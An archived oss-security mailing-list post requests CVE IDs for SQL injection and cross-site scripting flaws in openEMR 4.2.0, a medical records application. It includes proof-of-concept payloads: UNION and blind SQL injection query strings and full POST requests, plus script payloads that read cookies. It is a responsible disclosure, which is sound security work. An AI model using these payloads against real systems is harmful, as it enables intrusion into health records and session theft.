@@ -1,0 +1,240 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS-
+ and SQLi vulns</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="23">[&lt;prev]</a> <a href="25">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CALH-=7yNNrVGfD2u-+Yv7PLQ+tYi+qHcuYu4dD0H6GQQCdF21w&#64;mail.gmail.com&gt;
+Date: Sun, 22 Mar 2015 17:56:12 +0100
+From: Steffen Rösemann &lt;steffen.roesemann1986&#64;...il.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: CVE-Request -- openEMR v. 4.2.0 -- Multiple stored/reflecting XSS-
+ and SQLi vulns
+
+Hi Steve, Josh, vendors, list.
+
+I found multiple reflecting/stored XSS- and SQLi-vulns in electronic health
+records and medical practice application openEMR v. 4.2.0.
+
+==================
+Technical Details:
+==================
+
+All below described vulnerabilities can only be exploited by an already
+authenticated user.
+
+=====================
+SQL injection vulnerabilities
+=====================
+
+An SQL injection vulnerability can be found in the facility_admin.php file
+and can be abused by an attacker via the fid-parameter.
+
+Exploit-Example:
+
+http://
+{TARGET}/interface/usergroup/facility_admin.php?fid=3%27+and+1=2+union+select+1,user%28%29,3,4,version%28%29,database%28%29,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23+--+
+
+
+
+Another (blind) SQL injection vulnerability resides in the
+appt_encounter_report.php an can be abused by an attacker by modifying a
+the form_facility-parameter in a POST-request.
+
+Exploit-Example:
+
+POST /openemr-4.2.0/interface/reports/appt_encounter_report.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
+Firefox/31.0 Iceweasel/31.3.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+<a href="http://localhost/openemr-4.2.0/interface/reports/appt_encounter_report.php" rel="nofollow">http://localhost/openemr-4.2.0/interface/reports/appt_encounter_report.php</a>
+Cookie: OpenEMR=p30d0tu19a9r04tjgnuu1oqqq4
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 120
+
+form_facility=3%27+AND+substring(version(),1,1)=%275&amp;form_from_date=2015-01-13&amp;form_to_date=2015-01-13&amp;form_refresh=true
+
+
+The last (blind) SQL injection vulnerability resides in the
+appointments_report.php-file and can be as well abused by an attacker via
+crafting own SQL statements in the form_facility-parameter in a POST
+request.
+
+
+Exploit-Example:
+
+POST /openemr-4.2.0/interface/reports/appointments_report.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
+Firefox/31.0 Iceweasel/31.3.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+<a href="http://localhost/openemr-4.2.0/interface/reports/appointments_report.php" rel="nofollow">http://localhost/openemr-4.2.0/interface/reports/appointments_report.php</a>
+Cookie: OpenEMR=p30d0tu19a9r04tjgnuu1oqqq4
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 199
+
+form_facility=3%27+and+substring(version(),1,1)=%274&amp;form_provider=&amp;form_from_date=2015-01-13&amp;form_to_date=2015-01-13&amp;form_apptstatus=&amp;form_apptcat=ALL&amp;form_orderby=comment&amp;patient=&amp;form_refresh=true
+
+
+==============
+XSS vulnerabilities
+==============
+
+A reflecting XSS-vulnerability can be found in user_admin.php via the
+id-parameter.
+
+Exploit-Example:
+
+http://
+{TARGET}interface/usergroup/user_admin.php?id=4%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+
+
+A stored XSS vulnerability resides in add_edit_event.php via the
+input-field "form_comments" and is executed in appointments_report.php.
+
+
+Exploit-Example:
+
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+
+Can I get a CVE-ID / CVE-IDs for my findings?
+
+Thank you very much.
+
+Greetings from Germany.
+
+Steffen Rösemann
+
+
+References:
+
+[1] <a href="http://www.open-emr.org" rel="nofollow">http://www.open-emr.org</a>
+[2] <a href="http://sroesemann.blogspot.de/2015/01/sroeadv-2015-08.html" rel="nofollow">http://sroesemann.blogspot.de/2015/01/sroeadv-2015-08.html</a>
+[3] <a href="http://www.open-emr.org/wiki/index.php/OpenEMR_Patches" rel="nofollow">http://www.open-emr.org/wiki/index.php/OpenEMR_Patches</a>
+[4] <a href="http://seclists.org/fulldisclosure/2015/Mar/145" rel="nofollow">http://seclists.org/fulldisclosure/2015/Mar/145</a>
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
